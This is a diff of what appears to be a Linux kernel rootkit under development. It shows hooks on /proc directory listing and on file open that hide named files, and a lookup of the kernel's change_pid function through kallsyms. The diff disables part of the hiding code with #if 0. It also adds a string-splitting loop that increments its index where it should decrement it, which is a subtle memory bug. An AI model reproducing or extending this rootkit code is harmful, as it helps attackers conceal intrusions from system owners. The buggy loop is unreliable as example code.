@@ -595,15 +595,15 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
             return 0;
         }
     }
+#if 0
     for (i = 0; i < hidden_file_count; ++i) {
         printk(KERN_ALERT "Checking %s against %s\n", proc_name, hidden_files[i]);
-#if 0
         if (strncmp(proc_name, hidden_files[i], strlen(hidden_files[i])) == 0) {
             printk(KERN_ALERT "Found my hidden file\n");
             return 0;
         }
-#endif
     }
+#endif
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
 }
 
@@ -616,6 +616,7 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
     return result;
 }
 
+#if 0
 char name_buf[PATH_MAX];
 int bad_open(struct inode * ino, struct file *f) {
     char *path_name = dentry_path_raw(f->f_path.dentry, name_buf, PATH_MAX);
@@ -639,6 +640,7 @@ legit_open:
     result = backup_file_ops->open(ino, f);
     return result;
 }
+#endif
 
 /*
  * function:
@@ -657,6 +659,7 @@ char parent_name[PATH_MAX];
 static int __init mod_init(void) {
     int err;
     int i;
+    int x = 0;
 
     change_pidR = (void (*)(struct task_struct*, enum pid_type, struct pid*)) kallsyms_lookup_name(
             "change_pid");
@@ -677,6 +680,21 @@ static int __init mod_init(void) {
     proc_fops.iterate_shared = rk_iterate_shared;
     proc_inode->i_fop = &proc_fops;
 
+    char user_string[] = "/aing-matrix";
+    char user_file[40];
+    memset(user_file, 0, 40);
+
+    for (i = strlen(user_string) - 1; i >= 0; ++i) {
+        if (user_string[i] == '/') {
+            break;
+        }
+        user_file[x++] = user_string[i];
+        user_string[i] = '\0';
+    }
+
+    printk(KERN_INFO "Dir \"%s\"\tFile \"%s\"\n", user_string, user_file);
+
+#if 0
     if (kern_path("/aing-matrix", 0, &my_file_path)) {
         return -1;
     }
@@ -692,9 +710,9 @@ static int __init mod_init(void) {
     my_file_inode = my_file_path.dentry->d_parent->d_inode;
     file_ops = *my_file_inode->i_fop;
     backup_file_ops = my_file_inode->i_fop;
-    //file_ops.open = bad_open;
     file_ops.iterate_shared = rk_iterate_shared;
     my_file_inode->i_fop = &file_ops;
+#endif
 
 #if 0
     nfhi.hook = incoming_hook;
